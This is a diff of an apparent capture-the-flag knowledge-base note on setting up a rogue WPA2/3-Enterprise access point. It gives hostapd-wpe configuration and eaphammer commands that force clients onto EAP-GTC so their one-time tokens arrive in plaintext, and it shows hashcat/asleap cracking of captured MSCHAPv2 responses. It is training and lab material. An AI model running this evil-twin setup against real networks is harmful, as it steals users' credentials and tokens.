@@ -1,5 +1,7 @@
 # Rogue-RADIUS EAP flag
 
+**Verified against:** hostapd-wpe (hostapd 2.10) / eaphammer 1.14 / hashcat 6.2.x as of 2026-Q3
+
 ## The puzzle shape
 
 The target AP is WPA2/3-Enterprise (RSN AKM 1 or the WPA3-Ent
@@ -20,9 +22,10 @@ you log the MSCHAPv2 challenge/response or the GTC plaintext.
 # hostapd-wpe drops in as a hostapd replacement — same config +
 # extra logging of inner-EAP challenge/response.
 
-hostapd-wpe /etc/hostapd/rogue-enterprise.conf
+hostapd-wpe /etc/hostapd-wpe/rogue-enterprise.conf
 
-# Config:
+# Config (paths standardized on hostapd-wpe's own tree — matches
+# knowledge/hostapd-wpe/{reference,walkthrough}.md):
 interface=wlan0
 ssid=<target ent SSID>
 hw_mode=g
@@ -32,24 +35,28 @@ wpa_key_mgmt=WPA-EAP
 rsn_pairwise=CCMP
 ieee8021x=1
 eap_server=1
-eap_user_file=/etc/hostapd/hostapd.eap_user
-ca_cert=/etc/hostapd/ca.pem
-server_cert=/etc/hostapd/server.pem
-private_key=/etc/hostapd/server-key.pem
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.key
 ```
 
 Watch `/var/log/hostapd-wpe.log`. When a client associates + falls
 through, you'll see:
 
 ```
-username: alice
-challenge: <hex>
-response: <hex>
-jtr NETNTLM: alice:$NETNTLM$…
-hashcat: alice::::<challenge>:<response>
+username:      alice
+challenge:     <hex>                       # 8-byte ChallengeHash
+response:      <hex>                       # 24-byte NTResponse
+jtr NETNTLM:   alice:$NETNTLM$…
+hashcat 5500:  alice::::<NTResp_hex>:<ChallengeHash_hex>
 ```
 
-Feed the hashcat line to `hashcat -m 5500` or `asleap`.
+Feed the hashcat line to `hashcat -m 5500` or `asleap`. Fields are
+`user::domain::<NTResponse>:<ChallengeHash>` where `ChallengeHash`
+is the 8-byte SHA-1-derived value — hostapd-wpe pre-derives it for
+you. Full derivation formula in `enterprise/reference.md` under
+"MSCHAPv2 ChallengeHash derivation".
 
 ## Path B — eaphammer (higher-level orchestrator)
 
@@ -58,13 +65,15 @@ eaphammer --interface wlan0 \
           --essid "<target ent SSID>" \
           --creds \
           --auth wpa-eap \
-          --negotiate downgrade   # forces PEAP-GTC where possible
+          --negotiate manual \
+          --phase-1-methods PEAP \
+          --phase-2-methods GTC,MSCHAPV2   # prefer GTC where possible
 ```
 
-`--negotiate downgrade` is the interesting knob: if the client
-supports EAP-GTC, eaphammer negotiates it (over PEAP) and the
-client sends the token **in plaintext**. The token is often a
-one-time OTP; capture it within its validity window and it is
+`--negotiate manual --phase-2-methods GTC,MSCHAPV2` is the interesting
+knob: if the client supports EAP-GTC, eaphammer negotiates it (over
+PEAP) and the client sends the token **in plaintext**. The token is
+often a one-time OTP; capture it within its validity window and it is
 directly usable.
 
 ## The flag surface
